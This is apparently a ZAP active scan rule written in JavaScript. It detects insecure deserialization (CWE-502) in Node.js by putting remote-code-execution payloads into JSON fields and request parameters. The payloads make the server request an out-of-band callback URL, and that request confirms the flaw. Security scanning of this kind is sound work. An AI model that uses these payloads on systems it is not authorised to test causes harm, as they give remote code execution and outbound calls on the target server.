const ScanRuleMetadata = Java.type("org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata");
const Control = Java.type("org.parosproxy.paros.control.Control");
const ExtensionOast = Java.type("org.zaproxy.addon.oast.ExtensionOast");
const Alert = Java.type("org.parosproxy.paros.core.scanner.Alert");

function getMetadata() {
    return ScanRuleMetadata.fromYaml(`
id: 88888
name: JavaScript Deserialization RCE
description: >
  Detects insecure JavaScript deserialization (CWE-502) by injecting a payload
  that triggers remote code execution. When the server deserializes the payload,
  it performs an outbound HTTP request to a BOAST OAST canary URL. Receiving
  this callback confirms that attacker-controlled code was executed on the
  server.
category: INJECTION
risk: HIGH
confidence: MEDIUM
solution: >
  Avoid deserializing untrusted data. Use safe serialization formats, strict
  validation, and disable execution of arbitrary code during deserialization.
cweId: 502
wascId: 20
status: alpha
`);
}


var extOast = Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);

function scanNode(as, msg) {
    if (!extOast || !extOast.getCallbackService()) {
        print("[ERR] No OAST CallbackService available!");
        return;
    }

    var body = msg.getRequestBody().toString();
    if (!body || !body.trim().startsWith("{")) {
        return;
    }

    var json;
    try {
        json = JSON.parse(body);
    } catch (e) {
        return;
    }

    print("JSON BEFORE = " + JSON.stringify(json, null, 2));

    var alert = as.newAlert()
        .setRisk(Alert.RISK_HIGH)
        .setConfidence(Alert.CONFIDENCE_MEDIUM)
        .setMessage(msg)
        .setSource(Alert.Source.ACTIVE)
        .build();

    var canary = extOast.registerAlertAndGetPayloadForCallbackService(
        alert,
        "BOAST"
    );

    var exploit =
        "Function('return process')()" +
        ".mainModule.require('http')" +
        ".get('" + canary + "/pwn')";
    
    function injectAll(obj, payload) {
        var count = 0;

        for (var k in obj) {
            if (!obj.hasOwnProperty(k)) continue;
            if (typeof obj[k] === "string") {                
                obj[k] = payload;
                count++;
                continue;
            }

            if (typeof obj[k] === "object" && obj[k] !== null) {
                count += injectAll(obj[k], payload);
            }
        }
        return count;
    }

    var injectedCount = injectAll(json, exploit);

    if (injectedCount === 0) {
        return;
    }

    print("JSON AFTER = " + JSON.stringify(json, null, 2));

    var attackMsg = msg.cloneRequest();
    var newBody = JSON.stringify(json);

    attackMsg.getRequestBody().setBody(newBody);
    attackMsg.getRequestHeader().setContentLength(newBody.length);

    as.sendAndReceive(attackMsg, false, false);   
}

function scan(as, msg, param, value) {

    if (!extOast || !extOast.getCallbackService()) {
        print("[ERR] No OAST CallbackService available!");
        return;
    }

    print("=== Testing param: " + param + " on " + msg.getRequestHeader().getURI());

    var attackMsg = msg.cloneRequest();

    var alert = as.newAlert()
        .setRisk(Alert.RISK_HIGH)
        .setConfidence(Alert.CONFIDENCE_MEDIUM)
        .setMessage(attackMsg)
        .setParam(param)
        .setSource(Alert.Source.ACTIVE)
        .build();

    var canary = extOast.registerAlertAndGetPayloadForCallbackService(
        alert,
        "BOAST"
    );

    print("BOAST Canary = " + canary);

    var exploit =
        "({a:1,b:(function(){require('http').get('" + canary + "/pwn')})()})";

    print(exploit)
    alert.setAttack(exploit);
    
    as.setParam(attackMsg, param, exploit);
    as.sendAndReceive(attackMsg, false, false);

    print("[OK] Payload sent. OAST will auto-raise alert when callback arrives.");
}